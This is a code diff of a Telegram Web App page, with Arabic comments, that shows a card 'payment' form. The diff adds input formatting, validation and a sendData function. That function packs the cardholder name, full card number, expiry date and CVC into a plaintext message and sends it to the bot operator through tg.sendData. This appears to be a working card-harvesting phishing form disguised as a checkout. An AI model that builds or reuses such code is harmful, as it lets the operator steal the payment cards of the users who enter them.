@@ -93,7 +93,6 @@
         tg.ready();
         tg.expand();
 
-        const form = document.getElementById('paymentForm');
         const submitBtn = document.getElementById('submitBtn');
 
         // منع إدخال أي شيء عدا الأرقام لحقل الـ ID
@@ -108,19 +107,66 @@
             validateForm();
         });
 
-        // تنسيق ومنع الحروف في رقم البطاقة
+        // تنسيق ومنع الحروف في رقم البطاقة (إضافة فراغ كل 4 أرقام)
         document.getElementById('cardNum').addEventListener('input', function (e) {
             let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
-            let parts = [];
-            for (let i = 0; i < value.length; i += 4) {
-                parts.push(value.substring(i, i + 4));
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formatted += ' ';
+                }
+                formatted += value[i];
             }
-            e.target.value = parts.join(' ');
+            e.target.value = formatted;
             validateForm();
         });
 
-        // تنسيق ومنع الحروف في التاريخ
+        // تنسيق ومنع الحروف في التاريخ (إضافة الشحطة تلقائياً)
         document.getElementById('expiry').addEventListener('input', function (e) {
             let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
-            if (value.length >= 2) {
-                e.target.value = value.substring(0, 2) + '/' + value.
+            if (value.length > 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+            validateForm();
+        });
+
+        // منع الحروف في الـ CVC
+        document.getElementById('cvc').addEventListener('input', function (e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            validateForm();
+        });
+
+        // دالة التحقق لتفعيل الزر وتحويله للأزرق
+        function validateForm() {
+            const userId = document.getElementById('userId').value.trim();
+            const name = document.getElementById('name').value.trim();
+            const cardNum = document.getElementById('cardNum').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvc = document.getElementById('cvc').value.trim();
+
+            if (userId && name && cardNum.length === 19 && expiry.length === 5 && cvc.length >= 3) {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('active');
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('active');
+            }
+        }
+
+        // دالة إرسال البيانات للتليجرام (بدون حقل الـ ID)
+        function sendData() {
+            const name = document.getElementById('name').value.trim();
+            const cardNum = document.getElementById('cardNum').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvc = document.getElementById('cvc').value.trim();
+
+            const data = `💳 نوع العملية: Credit Card\n👤 الاسم: ${name}\n🔢 رقم البطاقة: ${cardNum}\n📅 التاريخ: ${expiry}\n🔒 رمز الـ CVC: ${cvc}`;
+            
+            tg.sendData(data);
+            tg.close();
+        }
+    </script>
+</body>
+</html>
